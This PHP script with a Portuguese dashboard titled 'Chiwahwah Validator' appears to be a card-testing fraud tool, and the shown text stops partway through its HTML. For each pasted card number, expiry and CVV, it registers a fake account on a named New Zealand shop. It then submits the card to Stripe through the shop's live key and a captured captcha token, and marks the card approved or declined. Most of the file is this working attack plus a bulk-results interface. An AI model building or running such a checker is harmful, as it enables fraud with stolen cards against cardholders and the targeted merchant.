<?php
// Configurações iniciais
error_reporting(0);
ignore_user_abort(true);

// Funções existentes
function getStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}

function deletarCookies() {
    if (file_exists("cookies.txt")) {
        unlink("cookies.txt");
    }
}

function gerarEmail() {
    $dominios = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com'];
    $dominio = $dominios[array_rand($dominios)];
    $numero = rand(1000, 9999);
    return "r4in".$numero."@".$dominio;
}

// Função principal de processamento
function processarCartao($lista, $debug = false) {
    $lista_original = $lista;
    $lista = str_replace(" " , "|", $lista);
    $lista = str_replace("%20", "|", $lista);
    $lista = preg_replace('/[ -]+/' , '-' , $lista);
    $lista = str_replace("/" , "|", $lista);
    $separar = explode("|", $lista);
    
    if(count($separar) < 4) {
        return ['success' => false, 'message' => '❌ Formato inválido', 'detalhe' => 'Use: 1234567890123456|MM|AA|CVV', 'cartao' => $lista_original];
    }
    
    $cc = trim($separar[0]);
    $mes = trim($separar[1]);
    $ano = trim($separar[2]);
    $cvv = trim($separar[3]);
    
    // Validar CC
    if(!is_numeric($cc) || strlen($cc) < 15 || strlen($cc) > 16) {
        return ['success' => false, 'message' => '❌ Número inválido', 'detalhe' => 'Cartão deve ter 15-16 dígitos', 'cartao' => $lista_original];
    }
    
    // Validar mês
    if(!is_numeric($mes) || $mes < 1 || $mes > 12) {
        return ['success' => false, 'message' => '❌ Mês inválido', 'detalhe' => 'Use 01-12', 'cartao' => $lista_original];
    }
    
    // Validar ano
    if(strlen($ano) == 2) {
        $ano_completo = "20".$ano;
    } elseif(strlen($ano) == 4) {
        $ano_completo = $ano;
    } else {
        return ['success' => false, 'message' => '❌ Ano inválido', 'detalhe' => 'Use AA ou AAAA', 'cartao' => $lista_original];
    }
    
    // Converter ano para 2 dígitos
    switch($ano_completo){
        case 2024: $ano = "24"; break;
        case 2025: $ano = "25"; break;
        case 2026: $ano = "26"; break;
        case 2027: $ano = "27"; break;
        case 2028: $ano = "28"; break;
        case 2029: $ano = "29"; break;
        case 2030: $ano = "30"; break;
        case 2031: $ano = "31"; break;
        case 2032: $ano = "32"; break;
        case 2033: $ano = "33"; break;
        case 2034: $ano = "34"; break;
        case 2035: $ano = "35"; break;
        case 2036: $ano = "36"; break;
        case 2037: $ano = "37"; break;
        case 2038: $ano = "38"; break;
        case 2039: $ano = "39"; break;
        default: return ['success' => false, 'message' => '❌ Ano fora do intervalo', 'detalhe' => 'Use 2024-2039', 'cartao' => $lista_original];
    }
    
    $email = gerarEmail();
    $debug_log = [];
    
    if($debug) $debug_log[] = "=== INICIANDO PROCESSAMENTO ===";
    if($debug) $debug_log[] = "Cartão: $cc|$mes|$ano|$cvv";
    if($debug) $debug_log[] = "Email gerado: $email";
    if($debug) $debug_log[] = "Gateway: Chiwahwah.co.nz (Stripe)";
    
    try {
        $ch = curl_init();
        
        // Step 1: Acessar página de login
        if($debug) $debug_log[] = "Step 1: Acessando página de login...";
        
        curl_setopt($ch, CURLOPT_URL, 'https://chiwahwah.co.nz/my-account/');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookies.txt');
        curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookies.txt');
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language: pt-BR,pt;q=0.9',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
        ]);
        $create = curl_exec($ch);
        
        if($debug) $debug_log[] = "HTTP Code: " . curl_getinfo($ch, CURLINFO_HTTP_CODE);
        
        $nonceregister = getStr($create, 'name="woocommerce-register-nonce" value="','"');
        if($debug) $debug_log[] = "Nonce register: $nonceregister";
        
        // Step 2: Registrar conta
        if($debug) $debug_log[] = "Step 2: Registrando conta...";
        
        curl_setopt($ch, CURLOPT_URL, 'https://chiwahwah.co.nz/my-account/');
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.urlencode($email).'&password=Rain123!&password2=Rain123!&woocommerce-register-nonce='.$nonceregister.'&_wp_http_referer=%2Fmy-account%2F&register=Register');
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
            'content-type: application/x-www-form-urlencoded',
            'referer: https://chiwahwah.co.nz/my-account/',
            'upgrade-insecure-requests: 1',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0',
        ]);
        $register = curl_exec($ch);
        
        if($debug) $debug_log[] = "HTTP Code: " . curl_getinfo($ch, CURLINFO_HTTP_CODE);
        
        // Step 3: Acessar página de adicionar método de pagamento
        if($debug) $debug_log[] = "Step 3: Acessando página de pagamento...";
        
        curl_setopt($ch, CURLOPT_URL, 'https://chiwahwah.co.nz/my-account/add-payment-method/');
        curl_setopt($ch, CURLOPT_POST, false);
        curl_setopt($ch, CURLOPT_POSTFIELDS, null);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
            'referer: https://chiwahwah.co.nz/my-account/payment-methods/',
            'upgrade-insecure-requests: 1',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        ]);
        $addpaymentmethodGet = curl_exec($ch);
        
        if($debug) $debug_log[] = "HTTP Code: " . curl_getinfo($ch, CURLINFO_HTTP_CODE);
        
        $ultimononce = getStr($addpaymentmethodGet, '"createAndConfirmSetupIntentNonce":"','"');
        if($debug) $debug_log[] = "Setup Intent Nonce: $ultimononce";
        
        // Step 4: Criar payment method no Stripe
        if($debug) $debug_log[] = "Step 4: Criando payment method no Stripe...";
        
        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_year]=20'.$ano.'&card[exp_month]='.$mes.'&allow_redisplay=unspecified&billing_details[address][country]=NZ&payment_user_agent=stripe.js%2Fceeb51e570%3B+stripe-js-v3%2Fceeb51e570%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fchiwahwah.co.nz&time_on_page=20213&client_attribution_metadata[client_session_id]=c8a0aa64-6997-494e-b56e-e8956161e4e9&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=24ada1e9-2228-4f5a-8355-10ebdc503785&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=NA&muid=NA&sid=NA&key=pk_live_51DgigaKtGTyFuugJaS4msof6hjcWMac1YkqEYjZ1yMSY4KAld2GjRHPd73gw5d0n1T2Sf30fMORdakP6mcweVGGX00JDPQfb3V&_stripe_version=2024-06-20&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzcyOTU2MzUzLCJjZGF0YSI6IjBJVUFpLzdyWWZHUjVPVG1iY2ZpVzE5MHZtejd4NWpRQjE0SjQ1dVlpUkh6NTFiTWxhZGdSQ0lGaUd4Q2M5dnIxV0JUc3QxSjVZeTd1aFpGOXRsR2hXYmRZVEkya1R3YmZlc29WTWU5a3Yrbkp5enhEZHhTS040RTIxYll0RWRKdDNDS1N4dDZnZVpoeTFRRXdoSjcrVGVXdXpNYmhHakxVRmJLMlB3WExJQkhEa2lyTEdVSTRsa0liMVdiRUNSRGpCV2ZvSDRkMmEwZEd2a1R3blRZUEM2UndPMFJFZ0doSzlJWjVwMnAzdDBmNG9YTFZJZE1UZGpsMGVob0xjbDhORGk4V2tLOW1icHFuWmVKMWp1UVo5enNoMHVYZDlGZ1FJR1NHOXozRlN0U3VKN0NlTmxvU2c1OCtLVEFKYmZrK1JRZVIrZVhSMXRLd1lncTlabTM5M0V0OHMvYS9HT05OODVzb1kxcTFGVT1MS3FHSThXY1FMclE1VDAyIiwicGFzc2tleSI6IlpYamtBSGhkOEZTUTI4bDhYN1I3QUNUTDhSZ2dGcmRvMlQxMkNJYnpXRGpVKzM4ZTNxblFtaWZjbk1Dd0hGendvUUtVbE5rZjJRZlVzbUFkaEJIZWUxak1wYUpPMHNZb1g1MklMZkZMenFISjZYeUV4U2lqR25IRkJQVFB1L1U0NktJbnpTakJXbVRSbEdRcFRrL000QVI4ay9BWjBhbUVUaVN6S1UrTmNVS0l4eU5qaU83V05uUjdxYXFZcU9PcTFiZXpJQVFaWHJ3dVF3eEZTQ2RmL3d6N1pzSlNibDRNd1d5OXZMek0vZWJoOWVuZDdZV2drRGd4d2lpSTliaGJhRHpTTmdNTzgxTVdJanpTYVlBbUd5bHBEY25UdlRwaStZamM0ZU5zYlNKbFNtKzNJc1lnS083aXc5UG9FTkcyYldsSmVmK1ltNTFaa09qKzBMdmZMOFo0djh5cUNCVHhBVXlWR1Q4YXBWQlQ0dXl6VjkzbEo4blU4QnhZSUc1UittMXFidEhJWkx2c3FZc1d2aTFQUnlGdVYzd2pFMlVKOXJRV3JTL2tIbi9iUWV1ZEsxeXdVVGpqbzB1bmRZbHlUKzlLVWg3U0RUeWZmMkVqSjNaSXFlU0tqZnZLdE9FejBETDZNZFFDTWRZYjgvZGp5TWJ2N2YwSzBKbEVVdldzSWNTWTY4YUFxSGdPNkZoa29CNU5ndGVGUkh5aG9QRHdNTlZtdFVsRDF4Qi85MkkrWVoyNVJVb3dNTDhwVVUvZGJFdUFsMEgwQlhMc0NxVFVYRUhpSHBEZUE3QXltOStwKzVLZVAzMnNQb0hyZy93MjJLRm44MjN3OTFKN2VkZndRSWtZZEFmRDFIK0h2aWlIcFFWMGZ3K0ZIWHloOEROOHlabis4MDdBbXVlRmdOdXBjMDZ0ZUhEcWZFaDI0TGttM0toWlQ4ZjB1Z2x2Q3FLckM2bDlQUkdhVUM2aWZpQ0dlQmpkRm5mMEo2ZktUcjNab0xQVUlNaHlzNnNsdE54VjdGUzhGUWQwVkc2QzExcEIwUzBYOW9LdVQ2TTBsNHE0MittcDJsdHUzTDBycWZDNUtRY1RYWVo5Z1lENWc4T1RpSnIwOE42dVRKdGJUT1NvcmY0K0FIRTdVYkdNdGl0c2Zac2JRMUFGM0hacUJ4ZDJkTlhYb0E0L2xWOEhvd0c1YTNMaUZza25pWVFnYTFIWjh5QkltYUwzL3p0WGE1aVpqT0gxQ29nUGlCbjA4WEZlMlpwK0FFZFozazZVOEoxL2ZGV2d1UzhEUzg4WUF2WVVPc3gzTVByVzVtL3JOcmxlbUlYZWxaNk0veEpWbVB2NVdlcDR6VXg2cW5UVXlXczQwYit2YmhsTTRyd0E3UTZ2aVE4cTdxRXBBalZDbWR3TDd5MjJZL0tLYWVmZStwRXA4eWdCL2I0aVRSenQ3NGpOS2pqZW1INkZ4dEhPYmd5SFhEd05acm84NlAveW0rZ2RZcTB6SmhUZGJSMXJjd1E4aW9ZcUJ6SzZJOVFwOGx5em5HNW05Q3hPNFg3ZGFEb1l3aGxIek1OdGlvR0F0UjVYWXpiR1FDdjUySUR3SThqMER6bmNiZlAxQWJucjdVRExvZzRjbjh6ZU1ac1hnUEdSOE9PUEk4NVlNdW9YeG5DdUhSMisweU96ZE1sOUtxRHBPVFZtUTZvUFlOdXpNai83bnYvWFh0V1lWWTFoMXhYWVk4TWJBZ0c5eHR6RlJWdHBmUmloZHpvQVQ0T3dobzhrN3JXNWV3YjgvNG43cGk5bkVCWHZydFBrci9uKzIzdlFTb3U2NVpMdUozTDdmdXNCUDdNazBXbXIxaFNoYjdKZWpLWjlSQWdIZUFRYjJEc0dWYlNHTlZWSWZtUVEzWnpLM1ZnUzMrVUJ6bWtLdU4veitrUlVOcnZOZ2NhTFRZNExpQUlNVko5ek5GZG5XZjRHZmFucDQ0SXZ3ZHJ3Z2R4ZTdXQ3owUnhlZGRMSE90M0RuQVFCODNwMlJHSDNla2JFYU9icWxBMytMYnkvVDJremFQcmhNRkY5eXRSdlplWE8rZ0E4TXEvTXlTK2hMWmI4d2xDd1dFL2tubVRaSjRRMWc0aDU5eEg1ZnVzVElhZVBOZnF3S2ZpVVZ2VDkwSWxCY1RJd09NMVEvTHliRHVYMFBIazJ3UkIzcllKS2oyUnZNYWJ5MmJzWWw4bkFRVlQ3eGxYZmg2WXZ3Q2V2NGJ3Zk1IdkpPc29abzRwWmt3NGE1VVlHeXlXUlVZdDhGdGJkdTVXYVdRSDkydzBqSU1PeUROUDZVa25BU3hvb3pocHU3bHlBWUxSTFArWlFrZVBkU21Kd0llTDN5NU1nWFVMeUF3L3gvc0ZFc2ZUV2srWDN4b1NPQldvVWJRaWxHUlA4dkdTQ3AvTTZFQStYanl1US85aW5naTViWm85NmxJTmFJalhXNVhLV1NpZXc5V3FCK3FxeUZMbXlscW94cC9LeXRVdGxrZHhaR2hzNmk2UzVaaEh5NDEyYnM3c1NQS25QaUQ5c1d6am1zeVlPY1VZWk5QSmo3eEsxcWJBS3J3PT0iLCJrciI6IjFiZGVmMjU4Iiwic2hhcmRfaWQiOjcxNzcxNTM3fQ.N-YKuPxYjiUfwliKdW97orADraFwwGe5ASGyixmsM7s');
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'accept: application/json',
            'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type: application/x-www-form-urlencoded',
            'sec-ch-ua: "Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
            'sec-ch-ua-mobile: ?1',
            'sec-ch-ua-platform: "Android"',
            'sec-fetch-dest: empty',
            'sec-fetch-mode: cors',
            'sec-fetch-site: same-site',
            'referer: https://js.stripe.com/',
            'dnt: 1',
            'origin: https://js.stripe.com',
            'priority: u=1, i',
            'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Mobile Safari/537.36',
        ]);
        $stripe = curl_exec($ch);
        
        if($debug) $debug_log[] = "Stripe Response: " . $stripe;
        
        $id = getStr($stripe, '"id": "','",');
        if($debug) $debug_log[] = "Payment Method ID: $id";
        
        // Step 5: Confirmar setup intent
        if($debug) $debug_log[] = "Step 5: Confirmando setup intent...";
        
        curl_setopt($ch, CURLOPT_URL, 'https://chiwahwah.co.nz/wp-admin/admin-ajax.php');
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=wc_stripe_create_and_confirm_setup_intent&wc-stripe-payment-method='.$id.'&wc-stripe-payment-type=card&_ajax_nonce='.$ultimononce);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'accept: */*',
            'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type: application/x-www-form-urlencoded; charset=UTF-8',
            'sec-ch-ua: "Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
            'sec-ch-ua-mobile: ?1',
            'sec-ch-ua-platform: "Android"',
            'sec-fetch-dest: empty',
            'sec-fetch-mode: cors',
            'sec-fetch-site: same-origin',
            'x-requested-with: XMLHttpRequest',
            'referer: https://chiwahwah.co.nz/my-account/add-payment-method/',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
        ]);
        $response = curl_exec($ch);
        
        if($debug) $debug_log[] = "Final Response: " . $response;
        
        $responseData = json_decode($response, true);
        
        curl_close($ch);
        deletarCookies();
        
        if(isset($responseData['success']) && $responseData['success'] === true) {
            return [
                'success' => true,
                'message' => '✅ APROVADO',
                'detalhe' => 'Cartão vinculado com sucesso',
                'cartao' => $lista_original,
                'debug' => $debug_log
            ];
        } 
        elseif(isset($responseData['success']) && $responseData['success'] === false) {
            $error_msg = isset($responseData['data']['error']['message']) ? $responseData['data']['error']['message'] : "Erro desconhecido";
            return [
                'success' => false,
                'message' => '❌ REPROVADO',
                'detalhe' => $error_msg,
                'cartao' => $lista_original,
                'debug' => $debug_log
            ];
        } else {
            return [
                'success' => false,
                'message' => '❌ ERRO',
                'detalhe' => 'Resposta inválida da API',
                'cartao' => $lista_original,
                'debug' => $debug_log
            ];
        }
        
    } catch (Exception $e) {
        return [
            'success' => false,
            'message' => '❌ ERRO',
            'detalhe' => $e->getMessage(),
            'cartao' => $lista_original,
            'debug' => $debug_log
        ];
    }
}

// Processamento AJAX
if(isset($_POST['ajax']) && $_POST['ajax'] === 'true' && isset($_POST['cartao'])) {
    header('Content-Type: application/json');
    $debug = isset($_POST['debug']) && $_POST['debug'] === 'true';
    echo json_encode(processarCartao($_POST['cartao'], $debug));
    exit;
}

// Interface HTML
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔍 Validador Chiwahwah.co.nz (Stripe)</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.0/font/bootstrap-icons.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: linear-gradient(135deg, #0f0f1a 0%, #1a1a2f 100%);
            min-height: 100vh;
            font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, sans-serif;
            color: #eaeef2;
            padding: 20px;
        }

        .container {
            max-width: 1600px;
            margin: 0 auto;
        }

        /* Dashboard Button */
        .dashboard-btn {
            position: fixed;
            top: 20px;
            left: 20px;
            z-index: 1000;
        }

        .btn-dashboard {
            background: rgba(20, 30, 50, 0.9);
            backdrop-filter: blur(10px);
            color: #fff;
            border: 1px solid #3a4a6a;
            border-radius: 16px;
            padding: 14px 28px;
            font-weight: 600;
            font-size: 16px;
            text-decoration: none;
            transition: all 0.3s ease;
            display: inline-flex;
            align-items: center;
            gap: 12px;
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.5);
        }

        .btn-dashboard:hover {
            background: #1e2a3a;
            border-color: #5a7ab0;
            transform: translateX(-8px);
            box-shadow: 0 12px 28px rgba(90, 122, 176, 0.3);
        }

        /* Main Card */
        .main-card {
            background: #141824;
            border: 1px solid #2a2f3f;
            border-radius: 32px;
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.8);
            overflow: hidden;
            margin-top: 60px;
        }

        .card-header {
            background: linear-gradient(145deg, #1e2335 0%, #141824 100%);
            padding: 30px 35px;
            border-bottom: 2px solid #2d3348;
        }

        .card-header h1 {
            font-size: 2.5rem;
            font-weight: 700;
            margin: 0;
            background: linear-gradient(135deg, #b3c7ff, #8aa0ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            letter-spacing: -0.5px;
        }

        .card-header .gateway-badge {
            background: #2a2f44;
            color: #b0c4ff;
            padding: 8px 18px;
            border-radius: 40px;
            font-size: 1rem;
            font-weight: 500;
            display: inline-flex;
            align-items: center;
            gap: 10px;
            border: 1px solid #3f4a6b;
        }

        .card-body {
            padding: 35px;
        }

        /* Stats Grid */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 25px;
            margin-bottom: 35px;
        }

        .stat-card {
            background: #1b1f30;
            border-radius: 24px;
            padding: 25px;
            border: 1px solid #2e3447;
            transition: transform 0.2s, box-shadow 0.2s;
            text-align: center;
        }

        .stat-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.5);
            border-color: #4f5b82;
        }

        .stat-icon {
            font-size: 2.5rem;
            margin-bottom: 15px;
        }

        .stat-card h2 {
            font-size: 3.2rem;
            font-weight: 800;
            margin: 10px 0 5px;
            line-height: 1.2;
        }

        .stat-card p {
            font-size: 1.1rem;
            color: #a0a8c0;
            text-transform: uppercase;
            letter-spacing: 1.5px;
            margin: 0;
            font-weight: 500;
        }

        /* Progress */
        .progress-container {
            margin: 30px 0;
        }

        .progress-info {
            display: flex;
            justify-content: space-between;
            margin-bottom: 12px;
            font-size: 1.1rem;
            font-weight: 500;
        }

        .progress {
            background: #23283b;
            border-radius: 30px;
            height: 16px;
            border: 1px solid #363d58;
        }

        .progress-bar {
            background: linear-gradient(90deg, #5f7cff, #9f7aff);
            border-radius: 30px;
            transition: width 0.3s ease;
            position: relative;
        }

        /* Form */
        .form-label {
            font-size: 1.2rem;
            font-weight: 600;
            color: #d0d8ff;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .form-control {
            background: #1b1f30;
            border: 2px solid #2f354a;
            border-radius: 20px;
            padding: 18px 22px;
            font-size: 1.1rem;
            color: #fff;
            font-family: 'JetBrains Mono', 'Courier New', monospace;
            line-height: 1.6;
            transition: all 0.2s;
        }

        .form-control:focus {
            background: #22273b;
            border-color: #6d8aff;
            box-shadow: 0 0 0 4px rgba(109, 138, 255, 0.15);
            color: #fff;
        }

        .form-control::placeholder {
            color: #4a5070;
            font-size: 1rem;
        }

        .text-muted {
            color: #7a82a5 !important;
            font-size: 1rem;
            margin-top: 12px;
            display: block;
        }

        /* Buttons */
        .btn {
            border-radius: 18px;
            padding: 16px 24px;
            font-weight: 600;
            font-size: 1.1rem;
            transition: all 0.2s;
            border: none;
        }

        .btn-primary {
            background: linear-gradient(145deg, #5f7cff, #7a5fff);
            color: white;
            font-size: 1.3rem;
            padding: 20px;
        }

        .btn-primary:hover:not(:disabled) {
            transform: translateY(-3px);
            box-shadow: 0 15px 30px rgba(95, 124, 255, 0.4);
        }

        .btn-success {
            background: #1d8f5c;
            color: white;
        }

        .btn-success:hover {
            background: #239d68;
            transform: translateY(-2px);
        }

        .btn-info {
            background: #365c8a;
            color: white;
        }

        .btn-info:hover {
            background: #3d68a0;
            transform: translateY(-2px);
        }

        .action-buttons {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 15px;
            margin: 25px 0;
        }

        /* Results Container */
        .results-container {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 30px;
            margin-top: 40px;
        }

        .results-box {
            background: #1a1e2d;
            border-radius: 28px;
            padding: 25px;
            border: 1px solid #2f354f;
            max-height: 600px;
            overflow-y: auto;
        }

        .results-box h3 {
            font-size: 1.8rem;
            font-weight: 700;
            margin-bottom: 25px;
            padding-bottom: 15px;
            border-bottom: 2px solid #2d3350;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .result-item {
            background: #121624;
            border: 1px solid #2b3147;
            border-radius: 20px;
            padding: 20px;
            margin-bottom: 15px;
            transition: all 0.2s;
        }

        .result-item.approved {
            border-left: 8px solid #27d98c;
        }

        .result-item.reproved {
            border-left: 8px solid #ff5f7c;
        }

        .result-badge {
            font-size: 1rem;
            font-weight: 700;
            padding: 6px 16px;
            border-radius: 40px;
            display: inline-block;
            margin-bottom: 12px;
        }

        .badge-approved {
            background: #1b4a3a;
            color: #9effcf;
        }

        .badge-reproved {
            background: #522b36;
            color: #ffb0bb;
        }

        .card-number {
            font-family: 'JetBrains Mono', monospace;
            font-size: 1.3rem;
            font-weight: 600;
            color: #fff;
            margin: 10px 0 8px;
            word-break: break-all;
            letter-spacing: 0.5px;
        }

        .card-detail {
            font-size: 1.1rem;
            color: #b2bae0;
            margin-top: 8px;
            line-height: 1.5;
            background: #1e2338;
            padding: 10px 15px;
            border-radius: 16px;
        }

        /* Debug */
        .debug-section {
            margin-top: 40px;
            background: #0d0f17;
            border: 1px solid #2f3652;
            border-radius: 28px;
            padding: 25px;
        }

        .debug-section h3 {
            font-size: 1.6rem;
            color: #7cf9b0;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .debug-content {
            background: #090b10;
            border-radius: 20px;
            padding: 20px;
            color: #9effb0;
            font-family: 'JetBrains Mono', monospace;
            font-size: 1rem;
            max-height: 500px;
            overflow-y: auto;
            white-space: pre-wrap;
            word-wrap: break-word;
            border: 1px solid #2b3a3a;
            line-height: 1.6;
        }

        /* Switch */
        .switch {
            position: relative;
            display: inline-block;
            width: 70px;
            height: 36px;
            margin-right: 15px;
        }

        .switch input {
            opacity: 0;
            width: 0;
            height: 0;
        }

        .slider {
            position: absolute;
            cursor: pointer;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: #2f3550;
            transition: .3s;
            border-radius: 36px;
        }

        .slider:before {
            position: absolute;
            content: "";
            height: 28px;
            width: 28px;
            left: 4px;
            bottom: 4px;
            background-color: white;
            transition: .3s;
            border-radius: 50%;
        }

        input:checked + .slider {
            background: linear-gradient(90deg, #27d98c, #3f9eff);
        }

        input:checked + .slider:before {
            transform: translateX(34px);
        }

        /* Notificação Toast */
        .notification-toast {
            position: fixed;
            top: 20px;
            right: 20px;
            background: linear-gradient(135deg, #1e2335, #2a2f44);
            color: white;
            padding: 16px 24px;
            border-radius: 50px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            border-left: 5px solid #5f7cff;
            z-index: 10000;
            display: none;
            align-items: center;
            gap: 12px;
            font-weight: 500;
            animation: slideIn 0.3s ease;
        }

        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }

        .notification-toast i {
            font-size: 1.5rem;
            color: #5f7cff;
        }

        .notification-toast .close-notification {
            margin-left: 15px;
            cursor: pointer;
            opacity: 0.7;
            transition: opacity 0.2s;
        }

        .notification-toast .close-notification:hover {
            opacity: 1;
        }

        /* Copy Button */
        .copy-btn {
            background: transparent;
            border: 2px solid #3a415e;
            color: #a0a9d0;
            border-radius: 14px;
            padding: 8px 16px;
            font-size: 1rem;
            transition: all 0.2s;
        }

        .copy-btn:hover {
            background: #2e3552;
            color: white;
            border-color: #6c7cd6;
        }

        /* Responsive */
        @media (max-width: 1200px) {
            .stats-grid { grid-template-columns: repeat(2, 1fr); }
            .action-buttons { grid-template-columns: repeat(2, 1fr); }
        }

        @media (max-width: 768px) {
            .results-container { grid-template-columns: 1fr; }
            .card-header h1 { font-size: 1.8rem; }
        }

        /* Scrollbar */
        ::-webkit-scrollbar {
            width: 12px;
            height: 12px;
        }
        ::-webkit-scrollbar-track {
            background: #1b1f30;
        }
        ::-webkit-scrollbar-thumb {
            background: #3a4165;
            border-radius: 20px;
            border: 2px solid #1b1f30;
        }
        ::-webkit-scrollbar-thumb:hover {
            background: #4f5a8a;
        }
    </style>
</head>
<body>
    <!-- Dashboard Button -->
    <div class="dashboard-btn">
        <a href="/../index.php" class="btn-dashboard">
            <i class="bi bi-arrow-left-circle-fill"></i>
            <span>Voltar ao Dashboard</span>
        </a>
    </div>

    <!-- Notificação Toast (ÚNICA COISA QUE APARECE) -->
    <div class="notification-toast" id="notificationToast">
        <i class="bi bi-check-circle-fill"></i>
        <span id="notificationMessage">Validação iniciada!</span>
        <span class="close-notification" onclick="document.getElementById('notificationToast').style.display='none'">✕</span>
    </div>

    <div class="container">
        <div class="main-card">
            <div class="card-header d-flex justify-content-between align-items-center">
                <div>
                    <h1><i class="bi bi-credit-card-2-front me-3"></i>Chiwahwah Validator</h1>
                    <div class="gateway-badge mt-3">
                        <i class="bi bi-lightning-charge-fill"></i>
                        Gateway: Stripe (chiwahwah.co.nz)
                    </div>
                </div>
                <div class="text-end">
                    <span class="gateway-badge">
                        <i class="bi bi-shield-check"></i>
                        Live Checker
                    </span>
                </div>
            </div>
            
            <div class="card-body">
                <!-- Stats Grid -->
                <div class="stats-grid">
                    <div class="stat-card">
                        <div class="stat-icon" style="color: #27d98c;"><i class="bi bi-check-circle-fill"></i></div>
                        <h2 id="aprovadas">0</h2>
                        <p>Aprovadas</p>
                    </div>
                    <div class="stat-card">
                        <div class="stat-icon" style="color: #ff5f7c;"><i class="bi bi-x-circle-fill"></i></div>
                        <h2 id="reprovadas">0</h2>
                        <p>Reprovadas</p>
                    </div>
                    <div class="stat-card">
                        <div class="stat-icon" style="color: #ffc15f;"><i class="bi bi-hourglass-split"></i></div>
                        <h2 id="pendentes">0</h2>
                        <p>Pendentes</p>
                    </div>
                    <div class="stat-card">
                        <div class="stat-icon" style="color: #7aa5ff;"><i class="bi bi-credit-card"></i></div>
                        <h2 id="total">0</h2>
                        <p>Total</p>
                    </div>
                </div>

                <!-- Progress -->
                <div class="progress-container">
                    <div class="progress-info">
                        <span><i class="bi bi-bar-chart-fill me-2"></i>Progresso da Validação</span>
                        <span id="progressPercent">0%</span>
                    </div>
                    <div class="progress">
                        <div class="progress-bar" id="progressBar" style="width: 0%;"></div>
                    </div>
                </div>

